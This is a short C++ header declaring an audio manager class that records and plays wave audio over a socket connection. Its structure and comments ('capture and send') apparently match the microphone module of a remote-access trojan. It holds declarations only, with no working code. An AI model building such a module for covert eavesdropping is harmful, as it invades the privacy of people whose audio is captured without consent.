#pragma once
#include "Manager.h"
#include "WavePlayback.h"
#include "WaveRecord.h"

#include <mmsystem.h>
#pragma comment(lib, "Winmm.lib")




struct WAVE_INFO
{
	TCHAR str[1024];//  
	int nIndex;    // 下标
};

class CAudioManager : public CManager
{
public:
	BOOL m_buser;
	CAudioManager(ISocketBase* pClient);
	virtual ~CAudioManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);



	bool Initialize();
	int EnumerateInputLines(TCHAR* szPname, TCHAR* str);
	BOOL sendWaveInfo(WAVE_INFO* Wave_Info, BYTE bToken);

	CAudioCode			m_ACode;     //编解码
	CWavePlayback* m_pWavePlayback;  //播放音频
	CWaveRecord* m_pWaveRecord;  //获取并且发送

private:

};
